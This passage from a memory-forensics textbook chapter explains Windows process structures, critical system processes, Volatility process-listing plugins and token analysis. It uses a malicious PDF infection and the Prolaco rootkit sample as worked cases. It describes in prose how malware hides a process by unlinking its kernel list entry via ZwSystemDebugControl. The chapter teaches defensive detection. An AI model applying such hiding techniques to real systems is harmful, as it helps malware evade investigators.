This chapter combines three of the most common initial steps in an investigation: determining what applications are running, what they’re doing (in terms of access to files, registry keys, and so on), and what security context (or privilege level) they have obtained. In doing so, you’ll also learn how to detect hidden processes, how to link processes to specific user accounts, how to investigate lateral movement across networks, and how to analyze privilege escalation attacks.

Although this chapter covers a wide range of process-related investigation techniques, it’s only the beginning—and it mainly deals with artifacts that exist in kernel memory. The analysis methods involving dynamic link libraries (DLLs), process memory, injected code, and things of that nature are covered in the chapters that follow.

## Processes

The diagram in [Figure 6-1](#figure6-1) shows several of the basic resources that belong to a process. At the center is the `_EPROCESS`, which is the name of the structure that Windows uses to represent a process. Although the structure names certainly differ among Windows, Linux, and Mac, all operating systems share the same concepts that are described in this high-level diagram. For example, they all have one or more threads that execute code, and they all have a table of handles (or file descriptors) to kernel objects such as files, network sockets, and mutexes.

Each process has its own private virtual memory space that’s isolated from other processes. Inside this memory space, you can find the process executable; its list of loaded modules (DLLs or shared libraries); and its stacks, heaps, and allocated memory regions containing everything from user input to application-specific data structures (such as SQL tables, Internet history logs, and configuration files). Windows organizes the memory regions using virtual address descriptors (VADs), which are discussed in Chapter 7.

![c06f001.eps](/api/v2/epubs/urn:orm:book:9781118824993/files/image_fi/825099c06/c06f001.png)

*[**Figure 6-1:**](#figureanchor6-1) A high-level diagram showing basic process resources*

As the figure also shows, each `_EPROCESS` points to a list of security identifiers (SIDs) and privilege data. This is one of the primary ways the kernel enforces security and access control. By combining all these concepts into your investigative procedure, you can gather a significant amount of evidence to help determine what process(es) were involved in malicious activity, what artifacts are related to an incident, and what user accounts might have been compromised.

---

## **Analysis Objectives**

Your objectives are these:

- **Process internals:** Learn how the operating system keeps track of processes and how Windows APIs enumerate them. This helps you understand why live tools are so easily deceived.
- **Identify critical processes:** Explore several critical Windows processes and learn how normal systems operate. You’ll be more prepared to spot anomalies, especially those that involve attempts to blend in with critical processes.
- **Generate visualizations:** Learn how to create visualizations that illustrate parent and child relationships between processes. Doing so helps you determine the chain of events that led to a particular process starting, which is often very important when piecing together an incident.
- **Detect Direct Kernel Object Manipulation (DKOM):** Spot attempts to hide processes by altering one or more process lists in kernel memory. Specifically, you’ll learn seven different ways to locate processes in memory dumps, which gives you a huge advantage against rootkits.

## **Data Structures**

Windows tracks processes by assigning them a unique `_EPROCESS` structure that resides in a non-paged pool of kernel memory. Here is how it appears for a 64-bit Windows 7 system:

```
>>> dt("_EPROCESS")
'_EPROCESS' (1232 bytes)
0x0   : Pcb                         ['_KPROCESS']
0x160 : ProcessLock                 ['_EX_PUSH_LOCK']
0x168 : CreateTime                  ['WinTimeStamp', {'is_utc': True}]
0x170 : ExitTime                    ['WinTimeStamp', {'is_utc': True}]
0x178 : RundownProtect              ['_EX_RUNDOWN_REF']
0x180 : UniqueProcessId             ['unsigned int']
0x188 : ActiveProcessLinks          ['_LIST_ENTRY']
0x198 : ProcessQuotaUsage           ['array', 2, ['unsigned long long']]
0x1a8 : ProcessQuotaPeak            ['array', 2, ['unsigned long long']]
0x1b8 : CommitCharge                ['unsigned long long']
0x1c0 : QuotaBlock                  ['pointer64', ['_EPROCESS_QUOTA_BLOCK']]
0x1c8 : CpuQuotaBlock               ['pointer64', ['_PS_CPU_QUOTA_BLOCK']]
0x1d0 : PeakVirtualSize             ['unsigned long long']
0x1d8 : VirtualSize                 ['unsigned long long']
0x1e0 : SessionProcessLinks         ['_LIST_ENTRY']
0x1f0 : DebugPort                   ['pointer64', ['void']]
[snip]
0x200 : ObjectTable                 ['pointer64', ['_HANDLE_TABLE']]
0x208 : Token                       ['_EX_FAST_REF']
0x210 : WorkingSetPage              ['unsigned long long']
0x218 : AddressCreationLock         ['_EX_PUSH_LOCK']
[snip]
0x290 : InheritedFromUniqueProcessId   ['unsigned int']
[snip]
0x2d0 : PageDirectoryPte            ['_HARDWARE_PTE']
0x2d8 : Session                     ['pointer64', ['void']]
0x2e0 : ImageFileName               ['String', {'length': 16}]
0x2ef : PriorityClass               ['unsigned char']
0x2f0 : JobLinks                    ['_LIST_ENTRY']
0x300 : LockedPagesList             ['pointer64', ['void']]
0x308 : ThreadListHead              ['_LIST_ENTRY']
0x318 : SecurityPort                ['pointer64', ['void']]
0x320 : Wow64Process                ['pointer64', ['void']]
0x328 : ActiveThreads               ['unsigned long']
0x32c : ImagePathHash               ['unsigned long']
0x330 : DefaultHardErrorProcessing  ['unsigned long']
0x334 : LastThreadExitStatus        ['long']
0x338 : Peb                         ['pointer64', ['_PEB']]
[snip]
0x444 : ExitStatus                  ['long']
0x448 : VadRoot                     ['_MM_AVL_TABLE']
0x488 : AlpcContext                 ['_ALPC_PROCESS_CONTEXT']
0x4a8 : TimerResolutionLink         ['_LIST_ENTRY']
0x4b8 : RequestedTimerResolution    ['unsigned long']
0x4bc : ActiveThreadsHighWatermark  ['unsigned long']
0x4c0 : SmallestTimerResolution     ['unsigned long']
```

## **Key Points**

The key points are these:

- `Pcb`: The kernel’s process control block (`_KPROCESS`). This structure is found at the base of `_EPROCESS` and contains several critical fields, including the `DirectoryTableBase` for address translation and the amount of time the process has spent in kernel mode and user mode.
- `CreateTime`: A UTC timestamp indicating when the process first started.
- `ExitTime`: A UTC timestamp indicating the time the process exited. This value is zero for still-running processes.
- `UniqueProcessId`: An integer that uniquely identifies the process (also known as the *PID*).
- `ActiveProcessLinks`: The doubly linked list that chains together active processes on the machine. Most APIs on a running system rely on walking this list.
- `SessionProcessLinks`: Another doubly linked list that chains together processes in the same session.
- `InheritedFromUniqueProcessId`: An integer that specifies the PID of the parent process. After a process is running, this member is not modified, even if its parent terminates.
- `Session`: This member points to the `_MM_SESSION_SPACE` structure (see Chapter 14) that stores information on a user’s logon session and graphical user interface (GUI) objects.
- `ImageFileName`: The filename portion of the process’ executable. This field stores the first 16 ASCII characters, so longer filenames will appear truncated. To get the full path to the executable, or to see the Unicode name, you can access the corresponding VAD node or members in the PEB (see Chapter 7).
- `ThreadListHead`: A doubly linked list that chains together all the process’ threads (each list element is an `_ETHREAD`).
- ActiveThreads: An integer indicating the number of active threads running in the process context. Seeing a process with zero active threads is a good sign that the process has exited.
- `Peb`: A pointer to the Process Environment Block (PEB). Although this member (`_EPROCESS.Peb`) exists in kernel mode, it points to an address in user mode. The PEB contains pointers to the process’ DLL lists, current working directory, command line arguments, environment variables, heaps, and standard handles.
- `VadRoot`: The root node of the VAD tree. It contains detailed information about a process’ allocated memory segments, including the original access permissions (read, write, execute) and whether a file is mapped into the region.

---

### Process Organization

The `_EPROCESS` structure contains a _`LIST_ENTRY` structure called `ActiveProcessLinks`. The _`LIST_ENTRY` structure contains two members: a `Flink` (forward link) that points to the `_LIST_ENTRY` of the *next* `_EPROCESS` structure, and the `Blink` (backward link) that points to the `_LIST_ENTRY` of the *previous* `_EPROCESS` structure. Together, these items create a chain of process objects, also called a doubly linked list (see Chapter 2). [Figure 6-2](#figure6-2) shows a diagram of how the `_LIST_ENTRY` structures link processes together.

![c06f002.eps](/api/v2/epubs/urn:orm:book:9781118824993/files/image_fi/825099c06/c06f002.png)

*[**Figure 6-2:**](#figureanchor6-2) Processes are chained together in a doubly linked list pointed to by PsActiveProcessHead.*

On a running system, tools, such as Process Explorer and Task Manager, rely on walking the doubly linked list of `_EPROCESS` structures. An API commonly used for this purpose is `NtQuerySystemInformation`, but many higher-level APIs provided by the operating system also access the same data.

### Enumerating Processes in Memory

As briefly described in the “Issues with Profile Selection” section of Chapter 3, to list processes, Volatility first locates the kernel debugger data block (`_KDDEBUGGER_DATA64`). From there, it accesses the `PsActiveProcessHead` member, which points to the head of the doubly linked list of `_EPROCESS` structures. We also discussed the pool-scanning approach in Chapter 5.

In this chapter, we present *many* other ways to find processes in a memory dump. It is important to implement alternative methods because the debugger data block, the linked-list pointers, and the pool tags are all nonessential to OS stability—which means they can be manipulated (accidentally or intentionally) to defeat forensic tools without disrupting the system or its processes.

### Critical System Processes

Before you begin analyzing the state of a system based on what applications are running, you should be familiar with the critical system processes; if you know what’s normal, you can detect what’s abnormal more quickly. Throughout the rest of the chapter, we discuss various practical investigative steps to verify the material you see here, so for now we’ll just focus on the theoretical concepts of how things *should* appear on clean systems.

---

**NOTE**

Patrick Olsen’s *Know your Windows Processes or Die Trying* ([http://sysforensics.org/2014/01/know-your-windows-processes.html](http://sysforensics.org/2014/01/know-your-windows-processes.html)) is a great resource that provides thorough descriptions of critical processes, including specific artifacts to check for during your analysis. We based some of the following facts on Patrick’s article:

---

- `Idle` and `System`: These are not real processes (in the sense that they have no corresponding executable on disk). `Idle` is just a container that the kernel uses to charge CPU time for idle threads. Similarly, `System` serves as the default home for threads that run in kernel mode. Thus, the `System` process (PID 4) appears to own any sockets or handles to files that kernel modules open.
- `csrss.exe`: The client/server runtime subsystem plays a role in creating and deleting processes and threads. It maintains a private list of the objects that you can use to cross-reference with other data sources. On systems before Windows 7, this process also served as the broker of commands executed via `cmd.exe`, so you can extract command history from its memory space. Expect to see multiple CSRSS processes because each session gets a dedicated copy; however, watch out for attempts to exploit the naming convention (`csrsss.exe` or `cssrs.exe`). The real one is located in the system32 directory.
- `services.exe`: The Service Control Manager (SCM) is described more thoroughly in Chapter 12, but in short, it manages Windows services and maintains a list of such services in its private memory space. This process should be the parent for any `svchost.exe` (service host) instances that you see, in addition to processes such as `spoolsv.exe` and `SearchIndexer.exe` that implement services. There should be only one copy of `services.exe` on a system, and it should be running from the system32 directory.
- `svchost.exe`: A clean system has multiple shared host processes running concurrently, each providing a container for DLLs that implement services. As previously mentioned, their parent should be `services.exe`, and the path to their executable should point to the system32 directory. In his blog, Patrick identifies a few of the common names (such as `scvhost.exe` and `svch0st.exe`) used by malware to blend in with these processes.
- `lsass.exe`: The local security authority subsystem process is responsible for enforcing the security policy, verifying passwords, and creating access tokens. As such, it’s often the target of code injection because the plaintext password hashes can be found in its private memory space. There should be only one instance of `lsass.exe` running from the system32 directory, and its parent is `winlogon.exe` on pre-Vista machines, and `wininit.exe` on Vista and later systems. Stuxnet created two fake copies of `lsass.exe`, which caused them to stick out like a sore thumb.
- `winlogon.exe`: This process presents the interactive logon prompt, initiates the screen saver when necessary, helps load user profiles, and responds to Secure Attention Sequence (SAS) keyboard operations such as `CTRL+ALT+DEL`. Also, this process monitors files and directories for changes on systems that implement Windows File Protection (WFP). As with most other critical processes, its executable is located in the system32 directory.
- `explorer.exe`: You’ll see one Windows Explorer process for each logged-on user. It is responsible for handling a variety of user interactions such as GUI-based folder navigation, presenting the start menu, and so on. It also has access to sensitive material such as the documents you open and credentials you use to log in to FTP sites via Windows Explorer.
- `smss.exe`: The session manager is the first real user-mode process that starts during the boot sequence. It is responsible for creating the sessions (see Chapter 14) that isolate OS services from the various users who may log on via the console or Remote Desktop Protocol (RDP).

Although this list isn’t comprehensive, it should provide enough information to get you started. You should also become familiar with a number of noncritical (but common) processes, such as `IEXPLORE.EXE` (and other browsers), e-mail clients, chat clients, document readers (Word, Excel, Adobe), antivirus applications, disk encryption tools, remote access and file transfer utilities (SSH, Telnet, RDP, VNC), password-cracking tools, and exploit toolkits.

### Analyzing Process Activity

Volatility provides a few commands you can use for extracting information about processes:

- `pslist` finds and walks the doubly linked list of processes and prints a summary of the data. This method typically cannot show you terminated or hidden processes.
- `pstree` takes the output from `pslist` and formats it in a tree view, so you can easily see parent and child relationships.
- `psscan` scans for `_EPROCESS` objects instead of relying on the linked list. This plugin can also find terminated and unlinked (hidden) processes.
- `psxview` locates processes using alternate process listings, so you can then cross-reference different sources of information and reveal malicious discrepancies.

An example of the `pslist` command follows:

```
$ python vol.py -f lab.mem --profile=WinXPSP3x86 pslist
Volatility Foundation Volatility Framework 2.4
Offset(V)  Name              PID  PPID  Thds    Hnds  Sess  Start
---------- -------------- ------ ----- ----- ------- -----  -------------------
0x823c8830 System              4     0    56     537 ----- 
0x81e7e180 smss.exe          580     4     3      19 -----  2013-03-14 03:02:22
0x82315da0 csrss.exe         644   580    10     449     0  2013-03-14 03:02:25
0x81f37948 winlogon.exe      668   580    18     515     0  2013-03-14 03:02:26
0x81fec128 services.exe      712   668    15     281     0  2013-03-14 03:02:27
[snip]
0x81eb4300 vmtoolsd.exe     1684  1300     6     213     0  2013-03-14 03:02:45
0x8210b9c8 IEXPLORE.EXE     1764  1300    16     642     0  2013-03-14 03:03:04
0x81e79020 firefox.exe       180  1300    27     447     0  2013-03-14 03:03:05
0x81cb63d0 wuauclt.exe      1576  1072     3     104     0  2013-03-14 03:03:40
0x81e86bf8 alg.exe          1836   712     5     102     0  2013-03-14 03:04:00
0x8209eda0 wscntfy.exe      2672  1072     1      28     0  2013-03-14 03:04:01
0x82013340 jucheck.exe      2388  1656     2     104     0  2013-03-14 03:07:45
0x81e79418 thunderbird.exe  3832  1300    30     339     0  2013-03-14 03:12:54
0x8202b398 AcroRd32.exe     3684   180     0 -------     0  2013-03-14 14:19:16
0x81ecd3c0 cmd.exe          3812  3684     1      33     0  2013-03-14 14:19:29
0x81f55bd0 a[1].php         2280  3812     1     139     0  2013-03-14 14:19:30
0x8223b738 IEXPLORE.EXE     2276  2280     7     280     0  2013-03-14 14:19:32
0x822c8a58 AcroRd32.exe     2644   180     0 -------     0  2013-03-14 14:40:16
```

The first column in the output, `Offset(V)`, displays the virtual address (in kernel memory) of the `_EPROCESS` structure. Moving to the right, you see the process name (or at least the first 16 characters), its PID, parent PID, number of threads, number of handles, session ID, and create time. You can gather a number of interesting facts by looking at this data:

- Three browsers are running (two instances of `IEXPLORE.EXE` and one `firefox.exe`), an e-mail client (`thunderbird.exe`), and Adobe Reader (`AcroRd32.exe`). Thus, this machine is very likely to be a client or workstation, as opposed to a server. Furthermore, if you suspect a client-side attack vector (such as a drive-by download or phishing exploit), it is wise to mine these processes for data related to the incident because there’s a good chance that one or more of them was involved.
- All processes, including the system-critical ones, are running in session 0, which indicates this is an older (Windows XP or 2003) machine (that is, before session 0 isolation) and that only one user is currently logged on.
- Two of the `AcroRd32.exe` processes have 0 threads and an invalid handle table pointer (indicated by the dashed lines). If the exit time column were displayed (we truncated it to prevent lines from wrapping on the page), you’d see that these two processes have actually terminated. They’re “stuck” in the active process list because another process has an open handle to them (see *The Mis-leading Active in PsActiveProcessHead*: [http://mnin.blogspot.com/2011/03/mis-leading-active-in.html](http://mnin.blogspot.com/2011/03/mis-leading-active-in.html)).
- The process with PID 2280 (`a[1].php`) has an invalid extension for executables—it claims to be a PHP file. Furthermore, based on its creation time, it has a temporal relationship with several other processes that started during the same minute (14:19:XX), including a command shell (`cmd.exe`).

Just looking at the process list can often give you some immediate clues worthy of further investigation. The `pstree` plugin can extend your knowledge by providing a visual interpretation of the parent and child relationships. As shown in the following output, a process’ children are indented to the right and prepended with periods.

```
$ python vol.py -f lab.mem --profile=WinXPSP3x86 pstree
Volatility Foundation Volatility Framework 2.4

[snip]

0x82263378:explorer.exe           1300   1188     11    363 2013-03-14 03:02:42 
. 0x81e85da0:TSVNCache.exe        1556   1300      7     53 2013-03-14 03:02:43 
. 0x81e79020:firefox.exe           180   1300     27    447 2013-03-14 03:03:05 
.. 0x8202b398:AcroRd32.exe        3684    180      0 ------ 2013-03-14 14:19:16 
... 0x81ecd3c0:cmd.exe            3812   3684      1     33 2013-03-14 14:19:29
.... 0x81f55bd0:a[1].php          2280   3812      1    139 2013-03-14 14:19:30
..... 0x8223b738:IEXPLORE.EXE     2276   2280      7    280 2013-03-14 14:19:32
.. 0x822c8a58:AcroRd32.exe        2644    180      0 ------ 2013-03-14 14:40:16 
. 0x81e79418:thunderbird.exe      3832   1300     30    339 2013-03-14 03:12:54 
. 0x8210b9c8:IEXPLORE.EXE         1764   1300     16    642 2013-03-14 03:03:04
```

When viewing the processes as a tree, it’s much easier to determine the possible events that took place during the attack. You can see that `firefox.exe` (PID 180) was started by `explorer.exe` (PID 1300). This is normal—anytime you launch an application via the start menu or by double-clicking a desktop icon, the parent is Windows Explorer. It is also fairly common for browsers to create instances of Adobe Reader (`AcroRd32.exe`) to render PDF documents accessed via the web. The situation gets interesting when you see that `AcroRd32.exe` invoked a command shell (`cmd.exe`), which then started `a[1].php`.

At this point, you can assume that a web page visited with Firefox caused the browser to open a malicious PDF. An exploited flaw in `AcroRd32.exe` allowed the attacker to use a command shell to further his efforts in installing additional malware on the system.

### Process Tree Visualizations

Another way to visualize the parent and child relationships between processes is to use the `psscan` command with the dot graph renderer (`--output=dot`). This functionality is based on Andreas Schuster’s PTFinder tool ([http://www.dfrws.org/2006/proceedings/2-Schuster-pres.pdf](http://www.dfrws.org/2006/proceedings/2-Schuster-pres.pdf)), which also produced graphs for visual analysis. Because this perspective of the processes is based on pool-scanning through the physical address space, it also incorporates terminated and hidden processes into the graph. You can generate a graph like this:

```
$ python vol.py psscan –f memory.bin --profile=Win7SP1x64
       --output=dot 
       --output-file=processes.dot
```

Then open the output file in Graphviz ([http://www.graphviz.org](http://www.graphviz.org)), as shown in [Figure 6-3](#figure6-3).

Based on the graph, you can verify several statements that were previously discussed. For example, `System` starts `smss.exe`, which starts `csrss.exe` and `winlogon.exe` (on Windows XP and 2003 systems). You can then see `winlogon.exe` creating `services.exe` and `lsass.exe`. The SCM process goes on to create `spoolsv.exe` and various instances of `svchost.exe`. But this is only part of the picture. The remainder of the graph is shown in [Figure 6-4](#figure6-4).

As seen here, a process with PID 1188 started `explorer.exe`, but its `_EPROCESS` is no longer memory-resident, so additional information, such as the parent process name, is not available. This is typical of XP and 2003 systems because `userinit.exe` starts Explorer and it exits soon after. As you follow the remaining arrows, the diagram confirms the theories we generated by looking at the `pstree` output.

![c06f003.eps](/api/v2/epubs/urn:orm:book:9781118824993/files/image_fi/825099c06/c06f003.png)

*[**Figure 6-3:**](#figureanchor6-3) A graph generated by psscan that shows critical system process relationships*

![c06f004.eps](/api/v2/epubs/urn:orm:book:9781118824993/files/image_fi/825099c06/c06f004.png)

*[**Figure 6-4:**](#figureanchor6-4) A diagram of processes involved in a malicious PDF exploit delivered via the web*

### Detecting DKOM Attacks

Many attacks are possible with Direct Kernel Object Manipulation (DKOM), but one of the most common is hiding a process by unlinking its entry from the doubly linked list. To accomplish this, overwrite the `Flink` and `Blink` pointers of surrounding objects so that they point *around* the `_EPROCESS` structure of the process to hide. Tools that execute on a running system *and* Volatility’s `pslist` command are susceptible to this attack, because they rely on the linked list. However, the `psscan` plugin uses the pool-scanning approach described in Chapter 5. This way, you can find `_EPROCESS` objects in memory, even if they are unlinked from the list.

Before we begin with the example, consider the following ways that malware can directly modify kernel objects:

- By loading a kernel driver, which then has unrestricted access to objects in kernel memory
- By mapping a writable view of the `\Device\PhysicalMemory` object (however, starting with Windows 2003 SP1 and Vista, access to this object is restricted from user-mode programs)
- By using a special native API function called `ZwSystemDebugControl`

#### The Case of Prolaco

To demonstrate how you can use `psscan` to find hidden processes, we’ll focus on a malware sample known to antivirus vendors as Prolaco (see [https://www.avira.com/en/support-threats-description/tid/5377/](https://www.avira.com/en/support-threats-description/tid/5377/)). This malware performs DKOM entirely from user mode, without loading any kernel drivers. It does so by using the `ZwSystemDebugControl` API in almost the exact manner described by Alex Ionescu on the OpenRCE website ([http://www.openrce.org/blog/view/354/](http://www.openrce.org/blog/view/354/)). [Figure 6-5](#figure6-5) shows a decompilation of Prolaco, as produced by IDA Pro and Hex-Rays.

Based on the image, you can make the following conclusions about how the malware performs DKOM:

- It enables the debug privilege (`SeDebugPrivilege`), which gives the process the required access for using `ZwSystemDebugControl`.
- It calls `NtQuerySystemInformation` with the `SystemModuleInformation` class to locate the base address of the NT kernel module.
- It finds `PsInitialSystemProcess`, which is a global variable exported by the NT module that points to the first process’ `_EPROCESS` object.
- It walks the linked list of `_EPROCESS` objects until it finds the process with a PID that matches `PidOfProcessToHide`. The fixed number `0x88` being used inside the `while`loop is the offset to `ActiveProcessLinks` within the `_EPROCESS` structure for 32-bit Windows XP systems. Also note that `PidOfProcessToHide` is passed into the function as a parameter. The malware derives the value using `GetCurrentProcessId`, which means it tries to hide itself.
- It calls `WriteKernelMemory`, which is merely a wrapper around `ZwSystemDebugControl` that writes four bytes at a time to a specified address in kernel memory. The function is called once to overwrite the `Flink` pointer and once for the `Blink` pointer. [Figure 6-6](#figure6-6) shows the contents of this function.

![c06f005.eps](/api/v2/epubs/urn:orm:book:9781118824993/files/image_fi/825099c06/c06f005.png)

*[**Figure 6-5:**](#figureanchor6-5) Prolaco sample loaded in IDA with Hex-Rays, showing the main DKOM function*

![c06f006.eps](/api/v2/epubs/urn:orm:book:9781118824993/files/image_fi/825099c06/c06f006.png)

*[**Figure 6-6:**](#figureanchor6-6) The ZwSystemDebugControl call used to overwrite pointers in kernel memory*

At this point, all the aforementioned live system APIs (and tools that rely on them) will report inaccurate process listings. In particular, they’ll fail to identify the one process most relevant to your investigation: the malware that just unlinked its own `_EPROCESS`.

#### Alternate Process Listings

As previously mentioned, it’s never a good idea to base your conclusions on only one piece of evidence. Because the process list can be manipulated, you should be aware of the available backup methods, or alternate process listings. Here are a few of them:

- **Process object scanning:** This is the pool-scanning approach discussed in Chapter 5. Remember that the pool tags it finds are nonessential; thus, they can also be manipulated to evade the scanner.
- **Thread scanning:** Because every process *must* have at least one active thread, you can scan for `_ETHREAD` objects and then map them back to their owning process. The member used for mapping is either `_ETHREAD.ThreadsProcess` (Windows XP and 2003) or `_ETHREAD.Tcb.Process` (Windows Vista and later). Thus, even if a rootkit manipulated the process’ pool tags to hide from `psscan`, it would also need to go back and modify the pool tags for all the process’ threads.
- **CSRSS handle table:** As discussed in the critical system process descriptions, `csrss.exe` is involved in the creation of every process and thread (with the exception of itself and the processes that started before it). Thus, you can walk this process’ handle table, as described later in the chapter, and identify all `_EPROCESS` objects that way.
- **PspCid table:** This is a special handle table located in kernel memory that stores a reference to all active process and thread objects. The `PspCidTable` member of the kernel debugger data structure points to the table. Two rootkit detection tools, Blacklight and IceSword, relied on the PspCid table to find hidden processes. However, the author of FUTo (see [http://www.openrce.org/articles/full_view/19](http://www.openrce.org/articles/full_view/19)) proved it was still possible to hide by removing processes from the table.
- **Session processes:** The `SessionProcessLinks` member of `_EPROCESS` associates all processes that belong to a particular user’s logon session. It’s not any harder to unlink a process from this list, as opposed to the `ActiveProcessLinks` list. But because live system APIs don’t depend on it, attackers rarely find value in targeting it.
- **Desktop threads:** One of the structures discussed in Chapter 14 is the Desktop (`tagDESKTOP`). These structures store a list of all threads attached to each desktop, and you can easily map a thread back to its owning process.

Plenty of additional sources of process listings remain. However, we’ve never encountered a rootkit that even comes close to hiding from the `pslist` plugin and then hides from all these methods as well. That’s why we built the `psxview` plugin, described next.

#### Process Cross-View Plugin

The `psxview` plugin enumerates processes in seven different ways: the active process linked list and the six methods previously identified. Thus, it’s unlikely that a rootkit can successfully hide from `psxview`. Realistically, it’s far easier to just inject code into a process that’s not hidden than to hide a process seven different ways in a reliable (that is, no bugs) and portable manner (works across all Windows versions).

The `psxview` plugin displays one row for each process it finds and seven columns that contain `True` or `False`, based on whether the process was found using the respective method. If you supply the `--apply-rules` option, you might also see `Okay` in the columns, which indicates that although the process was *not* found, it meets one of the valid exceptions described in the following list:

- Processes that start before `csrss.exe` (including `System`, `smss.exe` and `csrss.exe` itself) are not in the CSRSS handle table.
- Processes that start before `smss.exe` (including `System` and `smss.exe`) are not in the session process or desktop thread lists.
- Processes that have exited will not be found by any of the methods except process object scanning and thread scanning (if an `_EPROCESS` or `_ETHREAD` still happens to be memory resident).

An example of the `psxview` output when used with `--apply-rules` is shown in [Figure 6-7](#figure6-7). The last two processes (`msiexec.exe` and `rundll32.exe`) are found only by the process object scanner. However, as shown in the far right column, they both have nonzero exit times, which means they have terminated.

---

**Warning**

After attackers gain access to kernel memory, they can manipulate anything they want. In this case, they could overwrite the `_EPROCESS.ExitTime` member to make it appear as if the process exited; thus the `--apply-rules` option would improperly report it as `Okay`. However, processes that have truly exited have zero threads and an invalid handle table—so you can always double-check what those fields contain.

---

![c06f007.tif](/api/v2/epubs/urn:orm:book:9781118824993/files/image_fi/825099c06/c06f007.png)

*[**Figure 6-7:**](#figureanchor6-7) Psxview output after applying rules to consider exceptions*

As shown in the figure, the only process that stands out after considering the rules is `1_doc_RCData_61.exe`—it’s found by every method *except* the linked list of active processes. This is a clear indication that it is trying to hide from live system APIs by unlinking from the list.

## Process Tokens

A process’ token describes its security context. This context includes security identifiers (SIDs) of users or groups that the process is running as and the various privileges (specific tasks) that it is allowed to perform. When the kernel needs to decide whether a process can access an object or call a particular API, it consults data in the process’ token. As a result, this structure dictates many of the security-related controls that involve processes. This section describes how to leverage tokens to augment your investigations.

---

## **Analysis Objectives**

Your objectives are these:

- **Map SIDs to usernames:** A process’ token contains numerical SID values that you can translate into a string and then resolve into a user or group name. This ultimately enables you to determine the primary user account under which a process is running.
- **Detect lateral movement:** When hacking techniques such as pass-the-hash ([http://www.microsoft.com/security/sir/strategy/default.aspx#!pass_the_hash_attacks](http://www.microsoft.com/security/sir/strategy/default.aspx#!pass_the_hash_attacks)) are successful, they leave obvious artifacts in a process’ token. Specifically, you see a process’ security context jump to that of Domain Admin or Enterprise Admin.
- **Profile process behaviors:** A privilege (discussed later in the chapter) is the right to perform a specific task. If a process plans to engage in a task, it first must ensure that the privilege is present and enabled in its token. Thus, an *ex post facto* analysis of the privileges that a process has acquired can provide clues about what the process did (or planned to do).
- **Detect privilege escalation:** Some attacks have proven that live tools such as Process Explorer can be deceived into reporting that a process has fewer privileges than it actually has. You can use memory forensics to more accurately determine the truth.

## **Data Structures**

The `_TOKEN` structure is large, so we won’t display all the members. Furthermore, it changed significantly with respect to how privilege information is stored between Windows 2003 and Vista. The following code first shows the earlier versions of the structures, from a 64-bit 2003 system:

```
>>> dt("_TOKEN")
'_TOKEN' (208 bytes)
0x0   : TokenSource         ['_TOKEN_SOURCE']
0x10  : TokenId             ['_LUID']
0x18  : AuthenticationId    ['_LUID']
[snip]
0x4c  : UserAndGroupCount   ['unsigned long']
0x50  : RestrictedSidCount  ['unsigned long']
0x54  : PrivilegeCount      ['unsigned long']
[snip]
0x68  : UserAndGroups       ['pointer', ['array', 
    lambda x: x.UserAndGroupCount, ['_SID_AND_ATTRIBUTES']]]
0x70  : RestrictedSids      ['pointer64', ['_SID_AND_ATTRIBUTES']]
0x78  : PrimaryGroup        ['pointer64', ['void']]
0x80  : Privileges          ['pointer', ['array', 
    lambda x: x.PrivilegeCount, ['_LUID_AND_ATTRIBUTES']]]

>>> dt("_SID_AND_ATTRIBUTES")
'_SID_AND_ATTRIBUTES' (16 bytes)
0x0   : Sid                 ['pointer64', ['void']]
0x8   : Attributes          ['unsigned long']

>>> dt("_SID")
'_SID' (12 bytes)
0x0   : Revision              ['unsigned char']
0x1   : SubAuthorityCount     ['unsigned char']
0x2   : IdentifierAuthority   ['_SID_IDENTIFIER_AUTHORITY']
0x8   : SubAuthority          ['array', 
    lambda x: x.SubAuthorityCount, ['unsigned long']]

>>> dt("_SID_IDENTIFIER_AUTHORITY")
'_SID_IDENTIFIER_AUTHORITY' (6 bytes)
0x0   : Value                          ['array', 6, ['unsigned char']]

>>> dt("_LUID_AND_ATTRIBUTES")
'_LUID_AND_ATTRIBUTES' (12 bytes)
0x0   : Luid                           ['_LUID']
0x8   : Attributes                     ['unsigned long']

>>> dt("_LUID")
'_LUID' (8 bytes)
0x0   : LowPart                        ['unsigned long']
0x4   : HighPart                       ['long']
```

Here are the equivalent structures for 64-bit Windows 7:

```
>>> dt("_TOKEN")
'_TOKEN' (784 bytes)
0x0   : TokenSource         ['_TOKEN_SOURCE']
0x10  : TokenId             ['_LUID']
0x18  : AuthenticationId    ['_LUID']
[snip]
0x40  : Privileges          ['_SEP_TOKEN_PRIVILEGES']
0x58  : AuditPolicy         ['_SEP_AUDIT_POLICY']
0x74  : SessionId           ['unsigned long']
0x78  : UserAndGroupCount   ['unsigned long']
[snip]
0x90  : UserAndGroups       ['pointer', ['array', 
   lambda x: x.UserAndGroupCount, ['_SID_AND_ATTRIBUTES']]]

>>> dt("_SEP_TOKEN_PRIVILEGES")
'_SEP_TOKEN_PRIVILEGES' (24 bytes)
0x0   : Present                        ['unsigned long long']
0x8   : Enabled                        ['unsigned long long']
0x10  : EnabledByDefault               ['unsigned long long']
```

## **Key Points**

The key points are these:

- `UserAndGroupCount`: This integer stores the size of the `UserAndGroups` array.
- `UserAndGroups`: An array of `_SID_AND_ATTRIBUTES` structures associated with the token. Each element in the array describes a different user or group that the process is a member of. The `Sid` member of `_SID_AND_ATTRIBUTES` points to a `_SID` structure, which has `IdentifierAuthority` and `SubAuthority` members that you can combine to form the `S-1-5-[snip]` SID strings.
- PrivilegeCount (Windows XP and 2003 only): This integer stores the size of the `Privileges` array.
- `Privileges` (Windows XP and 2003): An array of `_LUID_AND_ATTRIBUTES` structures that each describe a different privilege and its attributes (that is, present, enabled, enabled by default).
- `Privileges` (Windows Vista and later): This is an instance of `_SEP_TOKEN_PRIVILEGES`, which has three parallel 64-bit values (`Present`, `Enabled`, `EnabledByDefault`). The bit positions correspond to particular privileges, and the values of the bit (`on` or `off`) describe the privilege’s status.

---

### Live Response: Accessing Tokens

On a live machine, a process can access its own token through the `OpenProcessToken` API. To enumerate the SIDs or privileges, it can then use `GetTokenInformation` with the desired parameters. With administrator access, it can also query (or set) the tokens of other users’ processes, including the system-critical ones. Of course, existing tools already provide this type of functionality for you, such as Sysinternals Process Explorer. [Figure 6-8](#figure6-8) shows the token information for `explorer.exe`. The SID data appears at the top, and the privilege data appears in the lower level.

![c06f008.tif](/api/v2/epubs/urn:orm:book:9781118824993/files/image_fi/825099c06/c06f008.png)

*[**Figure 6-8:**](#figureanchor6-8) The Process Explorer Security tab shows SID and privilege information from process tokens.*

